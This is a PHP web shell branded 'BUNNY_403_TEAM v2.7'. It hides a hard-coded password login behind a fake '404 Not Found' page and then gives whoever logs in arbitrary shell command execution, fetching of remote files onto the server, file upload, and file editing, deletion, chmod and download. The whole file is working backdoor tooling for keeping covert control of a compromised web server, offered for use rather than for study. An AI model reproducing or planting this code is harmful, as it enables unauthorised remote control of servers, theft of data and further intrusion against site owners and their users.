<?php
error_reporting(0);
session_start();

// === THEME SYSTEM ===
$THEMES = [
    'red' => ['#ff0000', '#333'],
    'green' => ['#00ff00', '#222'],
    'white' => ['#ffffff', '#444'],
    'blue' => ['#00aaff', '#222'],
    'yellow' => ['#ffff00', '#333'],
    'purple' => ['#cc00ff', '#222']
];
$DEFAULT_THEME = 'red';
if (!isset($_SESSION['theme']) || !isset($THEMES[$_SESSION['theme']])) {
    $_SESSION['theme'] = $DEFAULT_THEME;
}
if (isset($_GET['theme']) && isset($THEMES[$_GET['theme']])) {
    $_SESSION['theme'] = $_GET['theme'];
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}
$theme_color = $THEMES[$_SESSION['theme']][0];
$border_color = $THEMES[$_SESSION['theme']][1];

$PASSWORD = "bunny1337";
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== $PASSWORD) {
    if ($_POST['pass'] === $PASSWORD) {
        $_SESSION['auth'] = $PASSWORD;
    } else {
        if (!isset($_POST['pass'])) {
            echo '<html><head><title>404</title><style>body{background:#fff;color:#000;font:14px Arial;padding:30px;text-align:center;cursor:pointer;}h1{margin:0;font-size:28px;}</style></head><body><h1>404 Not Found</h1><div id="p" style="display:none;"><form method=post><input type=password name=pass placeholder="Password" required><button>Login</button></form></div><script>document.onclick=()=>{p.style.display="block"}</script></body></html>';
            exit;
        } else {
            header("HTTP/1.0 403 Forbidden");
            die("<h1>🚫 403</h1><button onclick=location.reload()>Retry</button>");
        }
    }
}

$cwd = isset($_GET['dir']) ? urldecode($_GET['dir']) : getcwd();
@chdir($cwd);
$current_dir = getcwd();
$msg = '';

// Execute
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd'] . ' 2>&1');
}

// Remote Upload
if (isset($_POST['remote_url']) && trim($_POST['remote_url'])) {
    $url = $_POST['remote_url'];
    $save_as = trim($_POST['save_as'] ?? basename($url));
    $content = @file_get_contents($url);
    if ($content !== false && file_put_contents($save_as, $content)) {
        $msg = "✅ $save_as";
    } else $msg = "❌ Fetch failed";
}

// Create File (with content)
if (isset($_POST['create_file_name']) && trim($_POST['create_file_name'])) {
    $name = trim($_POST['create_file_name']);
    $content = $_POST['create_file_content'] ?? '';
    if (file_put_contents($name, $content)) {
        $msg = "✅ $name (" . (empty($content) ? 'empty' : strlen($content).'B') . ")";
    } else $msg = "❌ Create failed";
}

// Create Dir
if (isset($_POST['create_dir']) && trim($_POST['create_dir'])) {
    $name = trim($_POST['create_dir']);
    if (mkdir($name, 0755, true)) {
        $msg = "✅ $name";
    } else $msg = "❌ mkdir failed";
}

// Local Upload
if (isset($_FILES['upload_file']['name']) && $_FILES['upload_file']['error'] == 0) {
    $name = $_FILES['upload_file']['name'];
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $name)) {
        $msg = "✅ $name";
    } else $msg = "❌ Upload failed";
}

// File Actions
if (isset($_GET['action'])) {
    $file = urldecode($_GET['file']);
    $return = '?dir=' . urlencode($current_dir);

    switch ($_GET['action']) {
        case 'edit':
            if (isset($_POST['content'])) {
                file_put_contents($file, $_POST['content']);
                $msg = "✅ Saved: " . basename($file);
                header("Location: $return");
                exit;
            } else {
                echo "<form method=post><textarea name=content style='width:100%;height:200px;background:#00;color:#f0;font:14px monospace;'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br><button>Save</button></form>";
                exit;
            }
        case 'rename':
            if (isset($_POST['newname'])) {
                $new = dirname($file) . '/' . basename($_POST['newname']);
                rename($file, $new);
                $msg = "✅ Renamed to: " . basename($new);
            }
            header("Location: $return"); exit;
        case 'delete':
            if (is_dir($file)) {
                function del($d) { foreach(scandir($d) as $i) if($i!='.'&&$i!='..') del("$d/$i"); rmdir($d); }
                del($file);
            } else unlink($file);
            $msg = "✅ Deleted: " . basename($file);
            header("Location: $return"); exit;
        case 'chmod':
            chmod($file, octdec($_GET['mode']));
            $msg = "✅ Chmod: " . decoct(fileperms($file) & 0777);
            header("Location: $return"); exit;
        case 'download':
            if (file_exists($file)) {
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                readfile($file); exit;
            }
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>BUNNY_403_TEAM v2.7</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root {
            --bg: #000;
            --fg: #fff;
            --accent: <?= $theme_color ?>;
            --gray: #111;
            --border: <?= $border_color ?>;
        }
        body {
            background: var(--bg);
            color: var(--fg);
            font: 14px 'Courier New', monospace;
            padding: 14px;
            line-height: 1.5;
            margin: 0;
        }
        .header {
            text-align: center;
            margin-bottom: 16px;
            padding-bottom: 8px;
            border-bottom: 2px solid var(--accent);
        }
        .logo {
            color: var(--accent);
            font-weight: bold;
            font-size: 18px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .tagline {
            font-size: 12px;
            color: #aaa;
            margin-top: 4px;
        }
        .cwd {
            background: var(--gray);
            padding: 10px 12px;
            margin: 14px 0;
            font-family: monospace;
            border-left: 3px solid var(--accent);
        }
        .sec {
            background: var(--gray);
            border-radius: 4px;
            padding: 12px;
            margin: 14px 0;
            border: 1px solid var(--border);
        }
        .tit {
            color: var(--accent);
            font-weight: bold;
            margin: 8px 0;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }
        input[type=text], input[type=file], textarea {
            background: #000;
            border: 1px solid var(--accent);
            color: var(--fg);
            padding: 6px 8px;
            font: 14px monospace;
            width: 100%;
            margin: 6px 0;
        }
        button {
            background: var(--accent);
            color: white;
            border: none;
            padding: 6px 12px;
            font: 14px bold;
            cursor: pointer;
            margin: 0 4px;
        }
        button:hover { opacity: 0.9; }
        .btn-f { background: #ff9900; color: #000; }
        .btn-c { background: #00aa00; }
        table {
            width: 100%;
            font: 14px monospace;
            margin-top: 8px;
            border-collapse: collapse;
        }
        th, td {
            padding: 8px 10px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        th {
            background: #222;
            color: var(--accent);
        }
        .actions a {
            color: var(--accent);
            text-decoration: none;
            margin: 0 4px;
            font-size: 13px;
        }
        .actions a:hover { text-decoration: underline; }
        pre {
            background: #000;
            padding: 10px;
            border: 1px solid var(--border);
            margin: 10px 0;
            overflow-x: auto;
            color: #0f0;
            font: 14px monospace;
        }
        .msg {
            color: #0f0;
            font-weight: bold;
            margin: 10px 0;
        }
        .top {
            position: absolute;
            top: 12px;
            right: 12px;
            font-size: 13px;
        }
        .top a {
            color: var(--accent);
            text-decoration: none;
            margin-left: 8px;
        }
        .theme-menu {
            position: absolute;
            top: 36px;
            right: 12px;
            background: var(--gray);
            border: 1px solid var(--border);
            padding: 6px;
            display: none;
            z-index: 100;
        }
        .theme-menu a {
            display: block;
            color: var(--fg);
            text-decoration: none;
            padding: 2px 6px;
            font-size: 12px;
        }
        .theme-menu a:hover {
            background: var(--accent);
            color: #000;
        }
    </style>
</head>
<body>

<div class="top">
    [<a href="?logout=1">LOGOUT</a>]
    [<a href="#" onclick="document.getElementById('tm').style.display='block';return false;">🎨 Theme</a>]
    <div id="tm" class="theme-menu">
        <a href="?theme=red">🔴 Red</a>
        <a href="?theme=green">🟢 Green</a>
        <a href="?theme=white">⚪ White</a>
        <a href="?theme=blue">🔵 Blue</a>
        <a href="?theme=yellow">🟡 Yellow</a>
        <a href="?theme=purple">🟣 Purple</a>
    </div>
</div>

<div class="header">
    <div class="logo">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
        BUNNY_403_TEAM v2.7
    </div>
    <div class="tagline">Secure • Elegant • Full-Featured Web Shell</div>
</div>

<div class="cwd">
    <strong>Current Path:</strong> 
    <?php
    $parts = explode('/', trim($current_dir, '/'));
    $path = '';
    foreach ($parts as $part) {
        if ($part) {
            $path .= '/' . $part;
            echo "<a href='?dir=" . urlencode($path) . "' style='color:var(--accent);'>" . htmlspecialchars($part) . "</a>/";
        }
    }
    echo "<a href='?dir=" . urlencode(dirname($current_dir)) . "' style='color:#ff6666;margin-left:8px;'>[..]</a>";
    ?>
</div>

<?php if ($msg): ?><div class="msg"><?= $msg ?></div><?php endif; ?>

<!-- Terminal -->
<div class="sec">
    <div class="tit">💻 Terminal Command</div>
    <form method=post>
        <input type=text name=cmd placeholder="e.g. ls -la, id">
        <button>RUN</button>
    </form>
    <?php if (isset($output)): ?><pre><?= htmlspecialchars($output) ?></pre><?php endif; ?>
</div>

<!-- Remote Upload -->
<div class="sec">
    <div class="tit">🌐 Remote Upload (URL → File)</div>
    <form method=post>
        <input type=text name=remote_url placeholder="https://example.com/shell.txt  ">
        <input type=text name=save_as placeholder="save_as.txt">
        <button>FETCH</button>
    </form>
</div>

<!-- Local Upload -->
<div class="sec">
    <div class="tit">📁 Local Upload</div>
    <form method=post enctype=multipart/form-data>
        <input type=file name=upload_file>
        <button class="btn-f">UPLOAD</button>
    </form>
</div>

<!-- Create -->
<div class="sec">
    <div class="tit">🆕 Create New</div>
    <form method=post>
        <input type=text name=create_file_name placeholder="file.php">
        <textarea name=create_file_content placeholder="Enter file content..."></textarea>
        <button class="btn-c">Create File</button>
        <input type=text name=create_dir placeholder="folder">
        <button class="btn-c">Create Folder</button>
    </form>
</div>

<!-- File Manager -->
<div class="sec">
    <div class="tit">📂 File Manager</div>
    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Perm</th>
            <th>Actions</th>
        </tr>
        <?php
        $files = @scandir('.');
        if (!$files) echo "<tr><td colspan=4>❌ No dir</td></tr>";
        else foreach ($files as $f) {
            if ($f==='.'||$f==='..') continue;
            $p = realpath($f);
            if (!$p) continue;
            $is_dir = is_dir($p);
            $size = $is_dir ? '-' : filesize($p);
            $perm = decoct(fileperms($p) & 0777);
            echo "<tr>";
            echo "<td>";
            if ($is_dir) {
                echo "<a href='?dir=" . urlencode($p) . "' style='color:var(--accent);'>$f</a>";
            } else {
                echo $f;
            }
            echo "</td>";
            echo "<td>$size</td>";
            echo "<td>$perm</td>";
            echo "<td class='actions'>";
            echo "<a href='?action=edit&file=" . urlencode($f) . "&dir=" . urlencode($current_dir) . "' title='Edit'>✏️ Edit</a>";
            echo " <a href='?action=rename&file=" . urlencode($f) . "&dir=" . urlencode($current_dir) . "' title='Rename'>✏️ Rename</a>";
            echo " <a href='?action=delete&file=" . urlencode($f) . "&dir=" . urlencode($current_dir) . "' onclick='return confirm(\"Delete?\")' title='Delete'>🗑️ Delete</a>";
            echo " <a href='?action=chmod&file=" . urlencode($f) . "&mode=755&dir=" . urlencode($current_dir) . "' title='Chmod'>🔒 Chmod</a>";
            echo "</td></tr>";
        }
        ?>
    </table>
</div>

<script>
function promptRename(f) {
    const n = prompt('New name:', f);
    if (n) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.innerHTML = `<input type=hidden name=newname value="${n}">`;
        document.body.appendChild(form);
        form.action = `?action=rename&file=${encodeURIComponent(f)}&dir=<?= urlencode($current_dir) ?>`;
        form.submit();
    }
}
</script>

</body>
</html>